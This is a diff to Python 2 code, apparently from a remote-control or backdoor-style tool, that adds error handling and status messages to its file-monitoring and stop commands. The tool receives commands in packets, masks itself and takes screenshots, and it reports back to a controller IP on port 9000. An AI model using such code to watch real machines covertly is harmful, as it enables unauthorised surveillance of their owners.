@@ -81,16 +81,29 @@ def mask():
 def startMonitor(path, ip):
 	global monitor
 	
-	#store observer schedule 
-	monitor = observer.schedule(FileMonitor(ip),path)
-	observer.start() #start observer
+	try:
+		#store observer schedule 
+		monitor = observer.schedule(FileMonitor(ip),path)
+		observer.start() #start observer
+		
+		
+		print "Sending Response: File Monitoring Started\n"
+		message = "File/Folder Monitored: " + path
+		
+		#notify the client that a file is being monitored
+		
+		time.sleep(1)
+		helpers.sendMessage(message, configReader.srcIP, 9000)
+		
+	except OSError:
+		print "Received command to monitor but path is not a directory"
+		print "Notifying client...."
+		helpers.sendMessage("Path is not a directory", configReader.srcIP,9000)
+		return
 	
-	message = "File/Folder Monitored: " + path
 	
-	time.sleep(1)
 	
-	#notify the client that a file is being monitored
-	helpers.sendMessage(message, configReader.srcIP, 9000)
+	
 	
 	while True:
 		try:
@@ -216,24 +229,26 @@ def runCmd(packet):
 					fileProcess.daemon = True
 					fileProcess.start()
 
-					print "Sending Response: File Monitoring Started\n"
-					
 				#catch the error if something is already monitored
 				except RuntimeError:
 					helpers.sendMessage("You already have a monitor in progress", configReader.srcIP, 9000)
 				except OSError:
 					helpers.sendMessage("Path of file/folder not found", configReader.srcIP, 9000)
+					
 				
 			#command is stop
 			elif commandType == 'stop':
 				try:
 					stopMonitor()
 					fileProcess.terminate()
+					helpers.sendMessage("File Monitoring has stopped", configReader.srcIP,9000)
+					
 					print "Monitoring has stopped"
 				except AttributeError:
-						helpers.sendMessage("There is no monitor to stop", configReader.srcIP,9000)
 						print "Received command 'stop' but there is no file monitor running"
 						print "Notifying client...."
+						helpers.sendMessage("There is no monitor to stop", configReader.srcIP,9000)
+						
 						
 
 			#command is screenshot
